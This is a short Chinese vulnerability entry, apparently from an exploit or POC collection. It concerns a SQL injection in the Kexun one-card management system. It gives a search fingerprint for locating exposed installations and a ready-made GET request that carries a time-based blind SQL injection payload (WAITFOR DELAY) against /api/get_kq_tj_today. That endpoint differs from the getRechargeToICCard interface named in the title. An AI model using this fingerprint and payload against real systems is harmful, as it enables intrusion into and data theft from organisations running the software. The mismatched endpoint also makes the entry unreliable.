# 科讯一卡通管理系统getRechargeToICCard存在SQL注入漏洞

科讯一卡通管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="[http://www.ahkxsoft.com/"`
- **请求**：`GET /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：200